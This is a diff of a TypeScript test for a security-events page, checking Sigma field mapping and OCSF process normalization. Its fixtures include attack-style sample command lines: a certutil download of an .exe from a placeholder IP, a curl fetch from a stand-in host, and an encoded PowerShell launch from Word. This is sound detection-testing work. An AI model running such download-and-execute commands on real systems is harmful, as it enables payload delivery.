@@ -132,6 +132,7 @@ import {
 } from "Common/Types/SecurityEvent/ThreatIntelConstants";
 import TimeRange from "Common/Types/Time/TimeRange";
 import GenericNormalizer from "Common/Utils/SecurityEvent/GenericNormalizer";
+import OcsfNormalizer from "Common/Utils/SecurityEvent/OcsfNormalizer";
 import SecurityEventNormalizer from "Common/Utils/SecurityEvent/SecurityEventNormalizer";
 import SigmaRuleParser from "Common/Utils/SecurityEvent/Sigma/SigmaRuleParser";
 import StixPatternParser, {
@@ -771,6 +772,12 @@ describe("the Security Events page", () => {
       className: "TYPE_FIELDS",
       ruleName: "RULE_NAME_FIELDS",
       productName: "PRODUCT_FIELDS",
+      processName: "PROCESS_NAME_FIELDS",
+      processPath: "PROCESS_PATH_FIELDS",
+      processCommandLine: "COMMAND_LINE_FIELDS",
+      parentProcessName: "PARENT_PROCESS_NAME_FIELDS",
+      parentProcessPath: "PARENT_PROCESS_PATH_FIELDS",
+      parentProcessCommandLine: "PARENT_COMMAND_LINE_FIELDS",
     };
 
     expect(
@@ -806,6 +813,18 @@ describe("the Security Events page", () => {
       className: ["ssh_login", "file_access"],
       ruleName: ["rule one", "rule two"],
       productName: ["Falco", "auditd"],
+      processName: ["powershell.exe", "cmd.exe"],
+      processPath: [
+        "C:\\Windows\\System32\\certutil.exe",
+        "/usr/bin/curl",
+      ],
+      processCommandLine: [
+        "certutil -urlcache -f http://203.0.113.7/a.exe",
+        "curl -s https://get.example/x",
+      ],
+      parentProcessName: ["winword.exe", "bash"],
+      parentProcessPath: ["C:\\Windows\\explorer.exe", "/usr/bin/bash"],
+      parentProcessCommandLine: ["explorer.exe", "bash -c x"],
     };
 
     function read(field: string, event: NormalizedSecurityEvent): string {
@@ -1400,7 +1419,7 @@ describe("the Security Events page", () => {
     });
     expect(resolveSigmaField("CommandLine")).toEqual({
       kind: "textColumn",
-      column: "principalProcess",
+      column: "processCommandLine",
     });
     expect(resolveSigmaField("src_ip")).toEqual({
       kind: "textColumn",
@@ -1419,6 +1438,59 @@ describe("the Security Events page", () => {
     );
     expect(page).toContain(
       "An attribute is named as it is in the event (`threat.matched`, not `attributes.threat.matched`).",
+    );
+  });
+
+  it("reads Image, CommandLine, ParentImage and ParentCommandLine as the process an event is about and its parent, never as principalProcess", () => {
+    const line: string = lineStarting(
+      page,
+      "What a rule can say",
+      "- `Image` and `CommandLine`",
+    );
+    const named: Array<string> = codeSpans(line);
+
+    expect(named).toEqual([
+      "Image",
+      "CommandLine",
+      "processPath",
+      "processCommandLine",
+      "ParentImage",
+      "ParentCommandLine",
+      "parentProcessPath",
+      "parentProcessCommandLine",
+      "principalProcess",
+    ]);
+
+    // Each Sigma name reads the column the page pairs it with.
+    for (const [field, column] of [
+      ["Image", "processPath"],
+      ["CommandLine", "processCommandLine"],
+      ["ParentImage", "parentProcessPath"],
+      ["ParentCommandLine", "parentProcessCommandLine"],
+    ]) {
+      expect({ field, resolved: resolveSigmaField(field as string) }).toEqual({
+        field,
+        resolved: { kind: "textColumn", column },
+      });
+    }
+
+    // In a launch the actor is the parent: OCSF's actor.process.
+    const launch: NormalizedSecurityEvent = OcsfNormalizer.normalize({
+      class_uid: 1007,
+      activity_id: 1,
+      actor: { process: { name: "winword.exe", cmd_line: "winword.exe" } },
+      process: {
+        name: "powershell.exe",
+        cmd_line: "powershell.exe -enc JAB",
+        file: { path: "C:\\Windows\\powershell.exe" },
+      },
+    });
+
+    expect(launch.principalProcess).toBe("winword.exe");
+    expect(launch.parentProcessName).toBe("winword.exe");
+    expect(launch.processCommandLine).toBe("powershell.exe -enc JAB");
+    expect(page).toContain(
+      "`principalProcess` is the process that acted, which in a launch is the parent.",
     );
   });
 
